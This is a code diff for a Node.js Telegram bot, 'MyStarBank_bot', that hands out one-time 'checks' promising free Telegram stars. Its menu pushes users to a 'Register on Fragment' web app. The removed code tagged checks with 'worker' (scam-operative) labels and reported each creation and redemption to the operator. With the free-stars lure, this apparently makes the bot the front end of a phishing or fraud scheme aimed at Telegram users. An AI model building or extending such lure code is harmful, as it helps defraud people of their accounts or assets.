@@ -315,14 +315,94 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
 });
 
-// КОМАНДА ДЛЯ СОЗДАНИЯ ЧЕКА С ВОРКЕРОМ
-bot.onText(/\/create_check (\d+) (.+)/, (msg, match) => {
+// СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @MyStarBank_bot ДЛЯ ВСЕХ
+bot.onText(/@MyStarBank_bot/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    const amount = parseInt(match[1]);
-    const workerTag = match[2];
     
-    createCheck(chatId, userId, amount, workerTag);
+    // ВСЕ МОГУТ СОЗДАВАТЬ ЧЕКИ
+    bot.sendMessage(chatId, 
+        '🎫 <b>Создание чека</b>\n\nВыберите сумму для чека:',
+        {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
+                    [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
+                ]
+            }
+        }
+    );
+});
+
+// ОБРАБОТКА ВЫБОРА ЧЕКА
+bot.on('callback_query', async (query) => {
+    const data = query.data;
+    const userId = query.from.id;
+    const chatId = query.message.chat.id;
+    
+    try {
+        await bot.answerCallbackQuery(query.id);
+        
+        if (data === 'create_50' || data === 'create_100') {
+            const amount = data === 'create_50' ? 50 : 100;
+            
+            // СОЗДАЕМ ЧЕК БЕЗ ВОРКЕРА
+            const activations = 1;
+            const workerTag = 'unknown';
+            
+            db.run(`INSERT INTO checks (amount, activations, creator_id, worker_tag) VALUES (?, ?, ?, ?)`, 
+                [amount, activations, userId, workerTag], function(err) {
+                if (err) {
+                    bot.editMessageText('❌ Ошибка создания чека', {
+                        chat_id: chatId,
+                        message_id: query.message.message_id
+                    });
+                    return;
+                }
+                
+                const checkId = this.lastID;
+                let checkText, photoFile;
+                
+                if (amount === 50) {
+                    checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
+                    photoFile = 'stars.jpg';
+                } else {
+                    checkText = `<b>🎫 Чек на 100 звезд</b>\n\n💫 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
+                    photoFile = '100.png';
+                }
+                
+                // УДАЛЯЕМ СООБЩЕНИЕ ВЫБОРА
+                bot.deleteMessage(chatId, query.message.message_id).catch(e => {});
+                
+                const photoPath = path.join(__dirname, 'public', photoFile);
+                if (fs.existsSync(photoPath)) {
+                    bot.sendPhoto(chatId, photoPath, {
+                        caption: checkText,
+                        parse_mode: 'HTML',
+                        reply_markup: { 
+                            inline_keyboard: [[{ 
+                                text: `🪙 Забрать ${amount} звезд`, 
+                                url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
+                            }]] 
+                        }
+                    });
+                } else {
+                    bot.sendMessage(chatId, checkText, {
+                        parse_mode: 'HTML',
+                        reply_markup: { 
+                            inline_keyboard: [[{ 
+                                text: `🪙 Забрать ${amount} звезд`, 
+                                url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
+                            }]] 
+                        }
+                    });
+                }
+            });
+        }
+    } catch (error) {
+        console.log('Ошибка callback:', error);
+    }
 });
 
 // ГЛАВНОЕ МЕНЮ /start
@@ -349,13 +429,13 @@ function showMainMenu(chatId, userId) {
 ├ 🎫 Создать чек
 └ 🏦 Вывести средства
 
-💡 <b>Для воркеров:</b>
-Используйте команду /create_check сумма тег_воркера`;
+💡 <b>Для создания чека:</b>
+Напишите @MyStarBank_bot в любом чате`;
 
     const menuKeyboard = {
         inline_keyboard: [
             [{ text: "💰 Проверить баланс", callback_data: "check_balance" }],
-            [{ text: "🎫 Создать чек", callback_data: "create_check_menu" }],
+            [{ text: "🎫 Создать чек", callback_data: "create_check_info" }],
             [{ text: "🏦 Вывести средства", callback_data: "withdraw_funds" }],
             [{ text: "📲 Регистрация на Fragment", web_app: { url: WEB_APP_URL } }]
         ]
@@ -373,72 +453,6 @@ function showMainMenu(chatId, userId) {
             reply_markup: menuKeyboard
         });
     }
-}
-
-// ФУНКЦИЯ СОЗДАНИЯ ЧЕКА
-function createCheck(chatId, userId, amount, workerTag = 'unknown') {
-    // СОЗДАЕМ ЧЕК
-    const activations = 1;
-    
-    db.run(`INSERT INTO checks (amount, activations, creator_id, worker_tag) VALUES (?, ?, ?, ?)`, 
-        [amount, activations, userId, workerTag], function(err) {
-        if (err) {
-            bot.sendMessage(chatId, '❌ Ошибка создания чека');
-            return;
-        }
-        
-        const checkId = this.lastID;
-        let checkText, photoFile;
-        
-        if (amount === 50) {
-            checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
-            photoFile = 'stars.jpg';
-        } else if (amount === 100) {
-            checkText = `<b>🎫 Чек на 100 звезд</b>\n\n💫 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
-            photoFile = '100.png';
-        } else {
-            checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
-            photoFile = 'stars.jpg';
-        }
-        
-        // ДОБАВЛЯЕМ worker_tag В ССЫЛКУ
-        const checkUrl = `https://t.me/MyStarBank_bot?start=check_${checkId}_${workerTag}`;
-        
-        const photoPath = path.join(__dirname, 'public', photoFile);
-        if (fs.existsSync(photoPath)) {
-            bot.sendPhoto(chatId, photoPath, {
-                caption: checkText,
-                parse_mode: 'HTML',
-                reply_markup: { 
-                    inline_keyboard: [[{ 
-                        text: `🪙 Забрать ${amount} звезд`, 
-                        url: checkUrl
-                    }]] 
-                }
-            });
-        } else {
-            bot.sendMessage(chatId, checkText, {
-                parse_mode: 'HTML',
-                reply_markup: { 
-                    inline_keyboard: [[{ 
-                        text: `🪙 Забрать ${amount} звезд`, 
-                        url: checkUrl
-                    }]] 
-                }
-            });
-        }
-        
-        // ЛОГ СОЗДАНИЯ ЧЕКА
-        bot.sendMessage(MY_USER_ID,
-            `🎫 <b>СОЗДАН НОВЫЙ ЧЕК</b>\n\n` +
-            `👤 <b>Воркер:</b> ${workerTag}\n` +
-            `💫 <b>Сумма:</b> ${amount} звезд\n` +
-            `🆔 <b>ID чека:</b> ${checkId}\n` +
-            `👨‍💻 <b>Создатель:</b> @${userId}\n\n` +
-            `⏰ ${new Date().toLocaleString()}`,
-            { parse_mode: 'HTML' }
-        );
-    });
 }
 
 // ОБРАБОТКА CALLBACK
@@ -462,17 +476,15 @@ bot.on('callback_query', async (query) => {
                 );
             });
             
-        } else if (data === 'create_check_menu') {
-            // ПРОСТОЕ СООБЩЕНИЕ ДЛЯ СОЗДАНИЯ ЧЕКА
+        } else if (data === 'create_check_info') {
             bot.sendMessage(chatId,
                 `🎫 <b>Создание чека</b>\n\n` +
-                `💡 <b>Используйте команду:</b>\n` +
-                `<code>/create_check 50 worker_tag</code>\n\n` +
-                `<b>Примеры:</b>\n` +
-                `<code>/create_check 50 worker1</code>\n` +
-                `<code>/create_check 100 starhunter</code>\n\n` +
-                `🔗 <b>Для воркеров:</b>\n` +
-                `Добавьте ?worker_tag=ВАШ_ТЕГ к ссылке Fragment`,
+                `💡 <b>Чтобы создать чек:</b>\n` +
+                `1. Перейдите в любой чат\n` +
+                `2. Напишите <code>@MyStarBank_bot</code>\n` +
+                `3. Выберите сумму чека\n` +
+                `4. Отправьте чек в чат\n\n` +
+                `✨ <b>Всем доступно!</b>`,
                 { parse_mode: 'HTML' }
             );
             
@@ -511,9 +523,7 @@ bot.onText(/\/start (.+)/, (msg, match) => {
         [userId, msg.from.username], function(err) {});
     
     if (params.startsWith('check_')) {
-        const parts = params.split('_');
-        const checkId = parts[1];
-        const workerTag = parts[2] || 'unknown';
+        const checkId = params.split('_')[1];
         
         // ПРОВЕРЯЕМ ИСПОЛЬЗОВАЛ ЛИ УЖЕ ЭТОТ ЧЕК
         db.get(`SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, [userId, checkId], (err, usedRow) => {
@@ -536,17 +546,6 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                         [userId, msg.from.username, userId, row.amount]);
                     db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [userId, checkId]);
                 });
-                
-                // ЛОГ ИСПОЛЬЗОВАНИЯ ЧЕКА
-                bot.sendMessage(MY_USER_ID,
-                    `🎯 <b>ЧЕК ИСПОЛЬЗОВАН</b>\n\n` +
-                    `👤 <b>Воркер:</b> ${workerTag}\n` +
-                    `💫 <b>Сумма:</b> ${row.amount} звезд\n` +
-                    `🆔 <b>ID чека:</b> ${checkId}\n` +
-                    `👨‍💼 <b>Получил:</b> @${msg.from.username || 'N/A'}\n` +
-                    `⏰ ${new Date().toLocaleString()}`,
-                    { parse_mode: 'HTML' }
-                );
                 
                 bot.sendMessage(chatId, 
                     `🎉 <b>Получено ${row.amount} звезд!</b>\n\n` +
